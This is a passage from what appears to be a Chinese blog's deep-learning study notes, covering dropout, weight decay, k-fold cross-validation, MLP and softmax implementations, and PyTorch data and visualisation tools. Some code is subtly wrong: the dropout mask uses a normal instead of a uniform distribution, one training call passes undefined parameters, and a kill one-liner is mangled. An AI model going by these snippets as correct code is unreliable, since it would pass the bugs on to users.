概率肯定是在0-1之间 if dropout ==1: return torch.zeros_like(X) # 这种情况下把全部元素都丢弃 if dropout ==0: return X # mask矩阵为0-1之间的均匀随机分布，大于dropout为1小于为0 mask = (torch.randn(X.shape)\u003edropout).float() # 优先使用乘法而不是X[mask]=0，乘法速度远大于选取 return mask*X/(1.0-dropout) # 测试一下 # torch.tensor.uniform从均匀分布中抽样数值进行填充 # torch.zeros(3,3).uniform_(0,1) X= torch.arange(16, dtype = torch.float32).reshape((2, 8)) # print(X) # print(dropout_layer(X, 0.)) print(dropout_layer(X, 0.5)) # print(dropout_layer(X, 1.)) # 定义具有两个隐藏层的多层感知机，每个隐藏层包含256个单元 num_inputs, num_outputs, num_hiddens1, num_hiddens2 = 784, 10, 256, 128 dropout1, dropout2 = 0.2, 0.5 class Net(nn.Module): # (object)写法是继承，自己回顾一下老男孩的课程 def __init__(self,num_inputs,num_outputs,num_hiddens1,num_hiddens2,is_training = True): # 使用super方法可以重新调用父类中的函数 # python3 直接写成 ： super().__init__() # python2 必须写成 ：super(本类名,self).__init__() super(Net,self).__init__() self.num_inputs = num_inputs self.training = is_training # 隐藏层的设置，都是线性层，注意做好层数的前后连接 self.lin1 = nn.Linear(num_inputs,num_hiddens1) self.lin2 = nn.Linear(num_hiddens1,num_hiddens2) self.lin3 = nn.Linear(num_hiddens2,num_outputs) self.relu = nn.ReLU() def forward(self,X): H1 = self.relu(self.lin1(X.reshape(-1,self.num_inputs))) # 第一隐藏层 # 只有在训练模型时才使⽤dropout if self.training == True: # 在第⼀个全连接层之后添加⼀个dropout层 H1 = dropout_layer(H1, dropout1) H2 = self.relu(self.lin2(H1)) # 第二隐藏层 if self.training == True: # 在第⼆个全连接层之后添加⼀个dropout层 H2 = dropout_layer(H2, dropout2) out = self.lin3(H2) # 输出层不需要激活函数 return out net = Net(num_inputs, num_outputs, num_hiddens1, num_hiddens2) ## 训练和测试模型 num_epochs, lr, batch_size = 5, 100.0, 256 loss = torch.nn.CrossEntropyLoss() train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size) d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size, params, lr) ","date":"2022-09-13","objectID":"/%E4%B8%A2%E5%BC%83%E6%B3%95/:1:0","tags":["丢弃法","dropout"],"title":"丢弃法(dropout)","uri":"/%E4%B8%A2%E5%BC%83%E6%B3%95/"},{"categories":["AI"],"content":"简单实现 在PyTorch中，我们只需要在全连接层后添加Dropout层并指定丢弃概率。 在训练模型时，Dropout层将以指定的丢弃概率随机丢弃上一层的输出元素；在测试模型时（即model.eval()后），Dropout层并不发挥作用。 net = nn.Sequential(nn.Flatten(), nn.Linear(784, 256), nn.ReLU(), # 在第⼀个全连接层之后添加⼀个dropout层 nn.Dropout(dropout1), nn.Linear(256, 128), nn.ReLU(), # 在第⼆个全连接层之后添加⼀个dropout层 nn.Dropout(dropout2), nn.Linear(128, 10)) def init_weights(m): if type(m) == nn.Linear: nn.init.normal_(m.weight, std=0.01) net.apply(init_weights) optimizer = torch.optim.SGD(net.parameters(), lr=0.5) d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, batch_size, None, None, optimizer) 我们可以通过使用丢弃法应对过拟合。 丢弃法只在训练模型时使用。 ","date":"2022-09-13","objectID":"/%E4%B8%A2%E5%BC%83%E6%B3%95/:2:0","tags":["丢弃法","dropout"],"title":"丢弃法(dropout)","uri":"/%E4%B8%A2%E5%BC%83%E6%B3%95/"},{"categories":["AI"],"content":" 权重衰减就是我们常说的L2正则化 正则化通过为模型损失函数添加惩罚项使学出的模型参数值较小。 权重衰减通过惩罚绝对值较大的模型参数为需要学习的模型增加了限制，这可能对过拟合有效。实际场景中，我们有时也在惩罚项中添加偏差元素的平方和。 其中超参数λ\u003e0。 当权重参数均为0时，惩罚项最小。 当λ较大时，惩罚项在损失函数中的比重较大，这通常会使学到的权重参数的元素较接近0。 当λ设为0时，惩罚项完全不起作用 从0实现 我们通过在目标函数后添加L2范数惩罚项来实现权重衰减。 %matplotlib inline import torch from torch import nn from d2l import torch as d2l n_train, n_test, num_inputs, batch_size = 20, 100, 200, 5 true_w, true_b = torch.ones((num_inputs, 1)) * 0.01, 0.05 # synthetic_data合成数据 train_data = d2l.synthetic_data(true_w, true_b, n_train) train_iter = d2l.load_array(train_data, batch_size) test_data = d2l.synthetic_data(true_w, true_b, n_test) test_iter = d2l.load_array(test_data, batch_size, is_train=False) # 初始化模型参数 def init_params(): w = torch.normal(0,1,size=(num_inputs,1),requires_grad=True) b = torch.zeros(1,requires_grad=True) return [w,b] # 定义L2惩罚函数 def l2_penalty(w): return torch.sum(w.pow(2))/2 # return torch.sum(w**2)/2 def train(lambd): w, b = init_params() # 生成一个线性回归函数，损失函数采用平方损失 net, loss = lambda X: d2l.linreg(X, w, b), d2l.squared_loss num_epochs, lr = 100, 0.003 # 此部分还是绘画模块 animator = d2l.Animator(xlabel='epochs', ylabel='loss', yscale='log', figsize=(6,3), xlim=[5, num_epochs], legend=['train', 'test']) # 依旧是迭代循环 for epoch in range(num_epochs): for X, y in train_iter: with torch.enable_grad(): # 增加了L2范数惩罚项，⼴播机制使l2_penalty(w)成为⼀个⻓度为`batch_size`的向量。 l = loss(net(X), y) + lambd * l2_penalty(w) l.sum().backward() d2l.sgd([w, b], lr, batch_size) if (epoch + 1) % 5 == 0: animator.add(epoch + 1, (d2l.evaluate_loss(net, train_iter, loss), d2l.evaluate_loss(net, test_iter, loss))) # norm是求2范数，item是求数值 print('w的L2范数是：', torch.norm(w).item()) train(0) # 可以看出有用训练数据较少，出现了严重的过拟合，test函数的loss基本没有下降 train(3) # 引入L2范数后，test的loss出现了同步下降,有效避免了过拟合 ","date":"2022-09-13","objectID":"/%E6%9D%83%E9%87%8D%E8%A1%B0%E5%87%8F/:0:0","tags":["权重衰减"],"title":"权重衰减","uri":"/%E6%9D%83%E9%87%8D%E8%A1%B0%E5%87%8F/"},{"categories":["AI"],"content":"简洁实现 # 简洁实现 def train_concise(wd): net = nn.Sequential(nn.Linear(num_inputs, 1)) for param in net.parameters(): param.data.normal_() loss = nn.MSELoss() num_epochs, lr = 100, 0.003 # 偏置参数没有衰减。 # 'weight_decay'就是我们需要的L2范数超参数 trainer = torch.optim.SGD([{\"params\":net[0].weight,'weight_decay': wd},{\"params\":net[0].bias}], lr=lr) animator = d2l.Animator(xlabel='epochs', ylabel='loss', yscale='log',xlim=[5, num_epochs], legend=['train', 'test']) for epoch in range(num_epochs): for X, y in train_iter: with torch.enable_grad(): trainer.zero_grad() l = loss(net(X), y) l.backward() trainer.step() if (epoch + 1) % 5 == 0: animator.add(epoch + 1, (d2l.evaluate_loss(net, train_iter, loss),d2l.evaluate_loss(net, test_iter, loss))) print('w的L2范数：', net[0].weight.norm().item()) train_concise(0) train_concise(3) 正则化通过为模型损失函数添加惩罚项使学出的模型参数值较小，是应对过拟合的常用手段。 权重衰减等价于L2L 范数正则化，通常会使学到的权重参数的元素较接近0。 权重衰减可以通过优化器中的weight_decay超参数来指定。 可以定义多个优化器实例对不同的模型参数使用不同的迭代方法。 ","date":"2022-09-13","objectID":"/%E6%9D%83%E9%87%8D%E8%A1%B0%E5%87%8F/:1:0","tags":["权重衰减"],"title":"权重衰减","uri":"/%E6%9D%83%E9%87%8D%E8%A1%B0%E5%87%8F/"},{"categories":["AI"],"content":" **交叉验证：**就是重复的使用数据，把得到的样本数据进行切分，组合为不同的训练集和测试集，用训练集来训练模型，用测试集来评估模型预测的好坏（一般在数据不是很充足的时候使用） 如果数据样本量小于一万条，我们就会采用交叉验证来训练优化选择模型。如果样本大于一万条的话，我们一般随机的把数据分成三份，一份为训练集（Training Set），一份为验证集（Validation Set），最后一份为测试集（Test Set）。用训练集来训练模型，用验证集来评估模型预测的好坏和选择模型及其对应的参数。把最终得到的模型再用于测试集，最终决定使用哪个模型以及对应参数。 k折交叉验证(k-fold Cross-validation)： k折交叉验证先将数据集随机划分为 k个大小相同的互斥子集，即 ，每次随机的选择 k-1份作为训练集，剩下的1份做测试集。 当这一轮完成后，重新随机选择 k份来训练数据。若干轮（小于 k ）之后，选择损失函数评估最优的模型和参数。 步骤： 将数据集分为训练集和测试集，将测试集放在一边 将训练集分为 k 份 每次使用 k 份中的 1 份作为验证集，其他全部作为训练集。 通过 k 次训练后，我们得到了 k 个不同的模型。 评估 k 个模型的效果，从中挑选效果最好的超参数 使用最优的超参数，然后将 k 份数据全部作为训练集重新训练模型，得到最终模型。 **最大优点：**所有数据都会参与到训练和预测中，有效避免过拟合，充分体现了交叉的思想。 ","date":"2022-09-13","objectID":"/k%E6%8A%98%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81-k-fold-cross-validation/:0:0","tags":["k-fold"],"title":"k折交叉验证(k-fold Cross-validation)是什么","uri":"/k%E6%8A%98%E4%BA%A4%E5%8F%89%E9%AA%8C%E8%AF%81-k-fold-cross-validation/"},{"categories":["AI"],"content":" 多层感知机在输出层与输入层之间加入了一个或多个全连接隐藏层，并通过激活函数对隐藏层输出进行变换。 ","date":"2022-09-06","objectID":"/%E5%AE%9E%E7%8E%B0%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA/:0:0","tags":["MLP"],"title":"实现多层感知机","uri":"/%E5%AE%9E%E7%8E%B0%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA/"},{"categories":["AI"],"content":"从零实现 import torch from torch import nn from d2l import d2ltorch as d2l batch_size = 256 train_iter,test_iter = d2l.load_data_fashion_mnist(batch_size=batch_size) # num_inputs 输入层，图片为28*28，固定大小 # num_outputs 输出层，输出为类别数量 10类 # 输入输出层大小为固定 num_inputs, num_outputs, num_hiddens = 784, 10, 256 num_hiddens2 = 128 # 先生成第一层，即w1*x+b1 # W1层，生成一个随机层 # 试着把W1层改为全为0或者全为1会如何 W1 = nn.Parameter(torch.rand(num_inputs, num_hiddens, requires_grad=True) * 0.01) # b1为偏差，初始为0 b1 = nn.Parameter(torch.zeros(num_hiddens, requires_grad=True)) # 输出层第二层 W2 = nn.Parameter(torch.randn(num_hiddens, num_hiddens2, requires_grad=True) * 0.01) b2 = nn.Parameter(torch.zeros(num_hiddens2, requires_grad=True)) # 自己添加第三层 W3 = nn.Parameter(torch.randn(num_hiddens2, num_outputs, requires_grad=True) * 0.01) b3 = nn.Parameter(torch.zeros(num_outputs, requires_grad=True)) params = [W1, b1, W2, b2, W3, b3] # 实现ReLU函数 def relu(x): a = torch.zeros_like(x) return torch.max(x,a) def net(X): X = X.reshape((-1, num_inputs)) # flattern操作 H = relu(X@W1 + b1) # 这⾥“@”代表矩阵乘法 等效于torch.matmul() S = relu(H@W2 + b2) return (S@W3+b3) loss = nn.CrossEntropyLoss() num_epochs, lr = 10, 0.1 updater = torch.optim.SGD(params, lr=lr) d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, updater) d2l.predict_ch3(net, test_iter) ","date":"2022-09-06","objectID":"/%E5%AE%9E%E7%8E%B0%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA/:1:0","tags":["MLP"],"title":"实现多层感知机","uri":"/%E5%AE%9E%E7%8E%B0%E5%A4%9A%E5%B1%82%E6%84%9F%E7%9F%A5%E6%9C%BA/"},{"categories":["AI"],"content":"从零实现softmax回归 softmax的公式: $$ softmax(X){ij} = \\frac{e^{X{ij}}}{\\sum_k{e^{X_{ij}}}} $$ import torch from IPython import display from d2l import torch as d2l # 这里对图像进行展平，将它们视为长度为784的向量，因为数据有10个类别，所以输出维度为10 batch_size = 256 # 每次选取256张图片 train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size) num_inputs = 784 num_outputs = 10 W = torch.normal(mean=0, std=0.01, size=(num_inputs, num_outputs), requires_grad=True) b = torch.zeros(num_outputs, requires_grad=True) def softmax(x): x_exp = torch.exp(x) partition = x_exp.sum(dim=1, keepdim=True) # 这里直接返回的就是张量 return x_exp / partition #这里应用了广播机制 # 实现softmax回归模型 def net(x, w=W, b=b): return softmax(torch.matmul(x.reshape(-1, w.shape[0]), w) + b) y = torch.tensor([0, 2, 2]) y_hat = torch.tensor([[0.1, 0.3, 0.6], [0.3, 0.2, 0.5], [0.1, 0.2, 0.6]]) # 这种选取方式相当于选取了[0,0],[1,2],[2,2]三个点 y_hat[[0, 1, 2], y] # 定义交叉熵函数 def cross_entropy(y_hat, y): return -torch.log(y_hat[range(len(y_hat)), y]) cross_entropy(y_hat, y) # 定义预测类别与真实类别之间的误差函数 def accuracy(y_hat, y): \"\"\"计算预测正确的数量\"\"\" if len(y_hat.shape) \u003e 1 and y_hat.shape[1] \u003e 1: # y_hat维数大于1且y_hat的列数大于1 # 将每个行中元素最大值的下标提取出来,作为y_hat的值(预测的类别) y_hat = y_hat.argmax(dim=1) # cmp用于判断每一行判断的分类与y实际值的比较 cmp = y_hat.type(y.dtype) == y # 为True转换为1,False return float(cmp.type(y.dtype).sum()) accuracy(y_hat, y) / len(y) # 该类的主要用处在于储存正确预测的数量和预测的总数量,包含在创建的两个变量中 class Accumulator: \"\"\"在n个变量上面累加\"\"\" def __init__(self, n): self.data = [0.0] * n # 这个函数用于储存正确预测的数量和预测的总数量 def add(self, *args): self.data = [a + float(b) for a, b in zip(self.data, args)] def reset(self): self.data = [0.0] * len(self.data) def __getitem__(self, idx): return self.data[idx] # 接下来定义一个评估任意net模型的准确率函数 def evaluate_accuracy(net, data_iter): \"\"\"计算在指定数据集上的模型精确度\"\"\" # isinstance() 用于判断目标函数是否属于目标类型,返回为bool类型 if isinstance(net, torch.nn.Module): net.eval() # 将模型设置为评估模式，评估模式下不会进行梯度计算 metric = Accumulator(2) # 正确预测数,预测总数 # numel,返回tensor里面的元素个数 for X, y in data_iter: metric.add(accuracy(net(X), y), y.numel()) return metric[0] / metric[1] def train_epoch_ch3(net, train_iter, loss, updater): if isinstance(net, torch.nn.Module): net.train() metric = Accumulator(3) for X, y in train_iter: # 对X进行softmax转换 y_hat = net(X) l = loss(y_hat, y) if isinstance(updater, torch.optim.Optimizer): # 梯度清除 updater.zero_grad() # 计算梯度 l.backward() # 参数更新 updater.step() # 类中放入 损失函数\\准确率\\样本数 metric.add(float(l) * len(y), accuracy(y_hat, y), y.size().numel()) else: # 这里如果是自己创建的计算方式,那么就按如下方式进行计算 # 计算梯度 l.sum().backward() # 参数更新 updater(X.shape[0]) metric.add(float(l.sum()), accuracy(y_hat, y), y.numel()) # 这里返回的是损失率和预测准确率 return metric[0] / metric[2], metric[1] / metric[2] class Animator: #@save \"\"\"在动画中绘制数据。\"\"\" def __init__(self, xlabel=None, ylabel=None, legend=None, xlim=None, ylim=None, xscale='linear', yscale='linear', fmts=('-', 'm--', 'g-.', 'r:'), nrows=1, ncols=1, figsize=(6.5, 4.5)): # 增量地绘制多条线 if legend is None: legend = [] d2l.use_svg_display() self.fig, self.axes = d2l.plt.subplots(nrows, ncols, figsize=figsize) if nrows * ncols == 1: self.axes = [self.axes, ] # 使⽤lambda函数捕获参数 self.config_axes = lambda: d2l.set_axes( self.axes[0], xlabel, ylabel, xlim, ylim, xscale, yscale, legend) self.X, self.Y, self.fmts = None, None, fmts def add(self, x, y): # 向图表中添加多个数据点 if not hasattr(y, \"__len__\"): y = [y] n = len(y) if not hasattr(x, \"__len__\"): x = [x] * n if not self.X: self.X = [[] for _ in range(n)] if not self.Y: self.Y = [[] for _ in range(n)] for i, (a, b) in enumerate(zip(x, y)): if a is not None and b is not None: self.X[i].append(a) self.Y[i].append(b) self.axes[0].cla() for x, y, fmt in zip(self.X, self.Y, self.fmts): self.axes[0].plot(x, y, fmt) self.config_axes() display.display(self.fig) display.clear_output(wait=True) def train_ch3(net,train_iter,test_iter,loss,num_epochs,updater): \"\"\"完整的迭代周期 num_epochs 迭代次数 \"\"\" animator = Animator(xlabel='epoch', xlim=[1, num_epochs], ylim=[0.3, 0.9], legend=['train loss', 'train acc', 'test acc']) for epoch in range(num_epochs): train_metrics = train_epoch_ch3(net, train_iter, ","date":"2022-09-06","objectID":"/%E5%AE%9E%E7%8E%B0softmax%E5%9B%9E%E5%BD%92/:1:0","tags":["softmax"],"title":"实现Softmax回归","uri":"/%E5%AE%9E%E7%8E%B0softmax%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"使用PyTorch实现softmax回归 \"\"\" 使用PyTorch实现sofamax回归 \"\"\" import torch from torch import nn from d2l import d2ltorch as d2l batch_size = 256 train_iter,test_iter = d2l.load_data_fashion_mnist(batch_size) # PyTorch不会隐式地调整输⼊的形状。因此， # 我们在线性层前定义了展平层（flatten），来调整⽹络输⼊的形状 net = nn.Sequential(nn.Flatten(), nn.Linear(784, 10)) def init_weights(m): \"\"\"初始化权重\"\"\" if type(m) == nn.Linear: nn.init.normal_(m.weight, std=0.01) net.apply(init_weights) # 交叉熵损失 loss = nn.CrossEntropyLoss() # 随机梯度下降 trainer = torch.optim.SGD(net.parameters(), lr=0.1) num_epochs = 10 from visdom import Visdom import time wind = Visdom(env=u\"testV\", use_incoming_socket=False) # 2.初始化窗口信息 wind.line([0.], # Y的第一个点的坐标 [0.], # X的第一个点的坐标 win='train_loss', # 窗口的名称 opts=dict(title='train_loss') # 图像的标例 ) def train_ch_test(net,train_iter,test_iter,loss,num_epochs,updater): \"\"\"完整的迭代周期 num_epochs 迭代次数 \"\"\" for epoch in range(num_epochs): # line train_metrics = d2l.train_epoch_ch3(net, train_iter, loss, updater) test_acc = d2l.evaluate_accuracy(net, test_iter) train_loss, train_acc = train_metrics print(train_metrics) # 使用visdom画出训练损失 wind.line([train_loss], [epoch+1], win='train_loss', update='append') time.sleep(0.5) # animator.add(epoch + 1, train_metrics + (test_acc,)) train_loss, train_acc = train_metrics assert train_loss \u003c 0.5, train_loss assert train_acc \u003c= 1 and train_acc \u003e 0.7, train_acc assert test_acc \u003c= 1 and test_acc \u003e 0.7, test_acc train_ch_test(net, train_iter, test_iter, loss, num_epochs, trainer) ","date":"2022-09-06","objectID":"/%E5%AE%9E%E7%8E%B0softmax%E5%9B%9E%E5%BD%92/:2:0","tags":["softmax"],"title":"实现Softmax回归","uri":"/%E5%AE%9E%E7%8E%B0softmax%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"简洁实现 import torch from torch import nn from d2l import torch as d2l batch_size = 256 train_iter,test_iter = d2l.load_data_fashion_mnist(batch_size) # PyTorch不会隐式地调整输⼊的形状。因此， # 我们在线性层前定义了展平层（flatten），来调整⽹络输⼊的形状 net = nn.Sequential(nn.Flatten(), nn.Linear(784, 10)) def init_weights(m): \"\"\"初始化权重\"\"\" if type(m) == nn.Linear: nn.init.normal_(m.weight, std=0.01) net.apply(init_weights) loss = nn.CrossEntropyLoss() trainer = torch.optim.SGD(net.parameters(), lr=0.1) num_epochs = 10 d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer) 也可以:http://www.xpshuai.cn/Pytorch%E5%AD%A6%E4%B9%A0-nn.html ","date":"2022-09-06","objectID":"/%E5%AE%9E%E7%8E%B0softmax%E5%9B%9E%E5%BD%92/:3:0","tags":["softmax"],"title":"实现Softmax回归","uri":"/%E5%AE%9E%E7%8E%B0softmax%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"数据处理 ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:1:0","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"Dataset 主要负责数据的抽象 DataSet是抽象类，无法实例化 数据集被抽象为Dataset类,实现自定义的数据集需要集成Dataset，并实现以下两个魔法方法： __getitem__(): 返回一条数据或一个样本。obj[index]等价于obj.__getitem__(index) __len__():返回样本是数量。len(obj)等价于obj.__len__() 下面是前面刘二老师讲的糖尿病例子中的数据集部分来说明dataset的用法： import torch import numpy as np # DataSet是抽象类，无法实例化 from torch.utils.data import Dataset # DataLoader可实例化 from torch.utils.data import DataLoader class DiabetesDataset(Dataset): def __init__(self, filepath): xy = np.loadtxt(filepath, delimiter=',', dtype=np.float32) # 获得数据集长度 self.len = xy.shape[0] self.x_data = torch.from_numpy(xy[:, :-1]) self.y_data = torch.from_numpy(xy[:, [-1]]) # 获得索引方法 # 每次返回一个样本 def __getitem__(self, index): return self.x_data[index], self.y_data[index] # 获得数据集长度 def __len__(self): return self.len dataset = DiabetesDataset('diabetes.csv') # num_workers表示多线程的读取 train_loader = DataLoader(dataset=dataset,batch_size=32,shuffle=True,num_workers=2) 另一个Kaggle上的\"Dogs vs Cats\"的例子： 但是这里返回的数据不适合实际使用，存在问题： 返回样本的形状不统一(每张图片的大小不一样)，这对于按batch训练的神经网络来说很不友好 返回的样本的数值较大，没有进行归一化 针对上述问题，pytorch提供了torchvision工具包， torchvision是一个视觉工具包，其中transform模块提供了一系列数据增强的操作： https://pytorch.org/vision/stable/transforms.html#transforms 将一系列操作使用Compose进行连接，如下： import torch as t from torch import nn from torch.utils.data import Dataset, DataLoader from PIL import Image import numpy as np import os from torchvision import transforms as T # 通过Compose将一系列操作连接起来 transforms = T.Compose([ T.Resize(224), # 缩放图像，保持长宽比不变，最短边为224像素 T.CenterCrop(224), # 从图像中间切除224像素X224像素的图层 T.ToTensor(), # 图像转换成tensor，归一化至[0,1] # 标准化至[-1,1],规定均值和标准差 T.Normalize(mean=[.5, .5, .5], std=[.5, .5, .5]) ]) # Dataset是抽象类，不能被实例化，所以也只能用来抽象数据集，所以读取数据操作交给DataLoader class DogCatDataset(Dataset): def __init__(self, root): # 所有图像的绝对路径，这里不实际加载影像，只是指定路径，在__getitem__时才会真正读取图像 imgs = os.listdir(root) self.imgs = [os.path.join(root,img) for img in imgs] # 使用 self.transforms = transforms def __getitem__(self, index): img_path = self.imgs[index] # dog：1，cat：0 label = 1 if 'dog' in img_path.split(\"/\"[-1]) else 0 data = Image.open(img_path) if self.transforms: data = self.transforms(data) return data, label def __len__(self): return len(self.imgs) # test dataset = DogCatDataset(\"./data/dogcat/traning/\") img, label = dataset[0] # 相当于调用__getitem__ for img, label in dataset: print(img.size(), img.float().mean(), label) 除了 上述变换，transforms还可以通过lanbda封装成自定义的转换策略。 同样，transforms分为: torchversion.transforms 和torchversion.transforms.functional : 提供了更灵活的操作，可以对多个对象以相同的参数进行操作，在使用时需要自己指定所有参数，具体方法翻看官方文档 torchvision中除了上述的transforms，还定义了常见的数据集，不过多介绍。 这里只介绍一个常用的Dataset：ImageFolder，它的实现和上面十分类似，它假设所有的图像按文件件保存，每个文件件下都是同一类别的图像…可以直接使用.class_idx按照类别打标签 ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:1:1","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"DataLoader 考虑到实际中一次处理的是一个batch的数据，同时还有对一批数据打乱顺序和并行加速等，所以提供了DataLoader https://pytorch.org/docs/stable/data.html#torch.utils.data.DataLoader from torch.utils.data import DataLoader train_loader = DataLoader(dataset=dataset,batch_size=32,shuffle=True,num_workers=2) dataiter = iter(train_loader) imgs, labels = next(dataiter) imgs.size() # dataloader是一个可迭代对象，可以像迭代器一样使用 for batch_datas, batch_labels in train_loader: print(batch_datas,batch_labels) 处理数据中，如果遇到某样本无法读取，比如某张图像损坏，此时在__getitem__方法会抛出异常，此时要将出错样本剔除/返回None，然后在DataLoader中实现自定义的collate_fn将空对象过滤掉 DataLoader默认使用单进程进行加载数据，可以指定进程数。 建议： 高负载的操做放在__getitem__中。多进行加载数据时，程序会并行调用__getitem__实现加速 DataSet中尽量包含只读对象，避免修改任何可变对象。在使用多进程加载数据时候，每个进程都会复制DataSet对象并执行_worker_loop函数。如果某一个进程修改了部分数据，那么在另一个进程复制的对象中，这部分数据并不会被修改。 PyTorch还提供了Sampler模块，用来对数据进行采样。当shuffle参数为True时，会调用RandomSampler采样器打乱数据。默认的采样器是SequentialSampler按顺序采样。有个很有用的采样器：WeightedRandomSampler会根据每个样本权重选择数据 多进程中如果主程序终止其他进程一直占用GPU和内存，如何杀： ps x | grep \u003cpy文件名\u003e | awk '{print \u00261}' | xargs kill -9 ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:1:2","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"预训练模型 torchvision还提供了深度学习中各种经典的网络结构及预训练模型，在torchvision.models中，包括： 经典的分类模型：VGG, ResNet, DenseNet, MobileNet… 语义分割模型：FCN, DeepLabV3… 目标检测模型：Faster RCNN…. 实例分割模型：Mask RCNN… 可以在其模型基础上根据需求对网络结构进行修改 ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:2:0","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"可视化工具 在训练神经网络时候，通常希望更直观了解训练情况，如损失函数的曲线，输入的图像，输出的图像等信息，以帮助优化提供方向和依据。 ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:3:0","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"1.TensorBoard TensorBoard最初是作为TF的可视化工具流行起来的，PyTorch1.1.0之后内置了TensorBoard相关接口，手动安装TensorBoard后便可调用相关结构进行数据可视化 TensorBoard安装\u0026启动： pip install tensorboard # 启动 tensorboard --logdir=[path即log'文件保存路径] 常见操作： 记录标量 tb.add_histogram(“conv1.bias”, model.conv1.bias, epoch) 显示图像 tb.add_image(“images”, grid) 显示直方图 tb.add_histogram() 显示网络结构 tb.add_graph(model, images) 可视化embedding tb.add_embedding() … import torch import torch.nn as nn import torch.optim as opt torch.set_printoptions(linewidth=120) import torch.nn.functional as F import torchvision import torchvision.transforms as transforms from torch.utils.tensorboard import SummaryWriter # 定义一个函数统计最后分类正确率 def get_num_correct(preds, labels): return preds.argmax(dim=1).eq(labels).sum().item() class CNN(nn.Module): def __init__(self): super().__init__() self.conv1 = nn.Conv2d(in_channels=1, out_channels=6, kernel_size=5) self.conv2 = nn.Conv2d(in_channels=6, out_channels=12, kernel_size=5) self.fc1 = nn.Linear(in_features=12*4*4, out_features=120) self.fc2 = nn.Linear(in_features=120, out_features=60) self.out = nn.Linear(in_features=60, out_features=10) def forward(self, x): x = F.relu(self.conv1(x)) x = F.max_pool2d(x, kernel_size = 2, stride = 2) x = F.relu(self.conv2(x)) x = F.max_pool2d(x, kernel_size = 2, stride = 2) x = torch.flatten(x,start_dim = 1) x = F.relu(self.fc1(x)) x = F.relu(self.fc2(x)) x = self.out(x) return x # 导入数据并创建训练加载器 train_set = torchvision.datasets.FashionMNIST(root=\"./data\", train = True, download=True, transform=transforms.ToTensor()) train_loader = torch.utils.data.DataLoader(train_set,batch_size = 100, shuffle = True) # 在tensorboard中展示图像和图 tb = SummaryWriter() model = CNN() images, labels = next(iter(train_loader)) grid = torchvision.utils.make_grid(images) tb.add_image(\"images\", grid) # 显示图像 tb.add_graph(model, images) # 显示网络结构 tb.close() # 这段代码执行后，打开浏览器本地的6006端口 # 记录标量/可视化训练循环中各参数变化情况 device = (\"cuda\" if torch.cuda.is_available() else cpu) model = CNN().to(device) train_loader = torch.utils.data.DataLoader(train_set,batch_size = 100, shuffle = True) optimizer = opt.Adam(model.parameters(), lr= 0.01) criterion = torch.nn.CrossEntropyLoss() tb = SummaryWriter() for epoch in range(10): total_loss = 0 total_correct = 0 for images, labels in train_loader: images, labels = images.to(device), labels.to(device) preds = model(images) loss = criterion(preds, labels) total_loss+= loss.item() total_correct+= get_num_correct(preds, labels) optimizer.zero_grad() loss.backward() optimizer.step() tb.add_scalar(\"Loss\", total_loss, epoch) tb.add_scalar(\"Correct\", total_correct, epoch) tb.add_scalar(\"Accuracy\", total_correct/ len(train_set), epoch) tb.add_histogram(\"conv1.bias\", model.conv1.bias, epoch) tb.add_histogram(\"conv1.weight\", model.conv1.weight, epoch) tb.add_histogram(\"conv2.bias\", model.conv2.bias, epoch) tb.add_histogram(\"conv2.weight\", model.conv2.weight, epoch) print(\"epoch:\", epoch, \"total_correct:\", total_correct, \"loss:\",total_loss) tb.close() ","date":"2022-09-05","objectID":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/:3:1","tags":["PyTorch","Dataset","DataLoader"],"title":"Pytorch常用工具","uri":"/pytorch%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"},{"categories":["AI"],"content":"2.Visdom Meta专门为PyTorch开发的一个可视化工具，开源于2017年3月, 轻量级，可以生人大多数科学运算可视化任务。 支持多种数据可视化：数值、图像、文本、视频…通同时支持PyTorch、Torch和Numpy Visdom两个重要概念： env:环境。不同环境的可视化结果相互隔离，互不影响。如果不指定env则默认使用main pane:窗格。可以对它进行拖动、缩放、保关闭等。一个程序可以使用同一个env中的不同pane，每个pane都可以可视化或记录不同的信息 安装: pip install visdom 启动服务： python -m visdom.server # 或直接挂后台 nohup python -m visdom.server \u0026 # visdom服务是一个Web Server服务，默认绑定8097端口，cs之间使用tornado进行非阻塞交互 